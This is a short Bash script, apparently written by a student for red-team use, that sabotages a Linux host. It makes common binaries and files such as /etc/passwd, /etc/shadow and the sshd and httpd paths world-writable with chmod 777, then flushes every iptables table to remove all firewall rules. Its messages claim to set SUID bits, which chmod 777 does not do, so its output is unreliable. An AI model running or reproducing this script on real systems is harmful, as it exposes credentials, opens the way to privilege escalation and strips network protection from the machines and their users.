##Dylan Nandlall 
##dan6705@rit.edu

suid_tool() {
    echo "Setting SUID on binaries";

    bins="cat tar awk find nano vim vi xtables-multi cp less more nmap man"
    bins="$bins watch chmod mv ncat"
    files="passwd skel shadow httpd sshd"

    for b in $bins; do
	chmod 777 /usr/bin/$b;
        [ "$?" = "0" ] && echo "SUID set on $b";
    done

    for f in $files; do
        chmod 777 /etc/$f;
        [ "$?" = "0" ] && echo "SUID set on $f";
    done

    return 0;
};

iptable_commands() {
    iptables -t mangle -F
    iptables -F
    iptables -t raw -F
    iptables -t nat -F
    iptables -t filter -F
    echo "iptable commands executed";
};


main() {
    suid_tool;
    iptable_commands;
};

main;
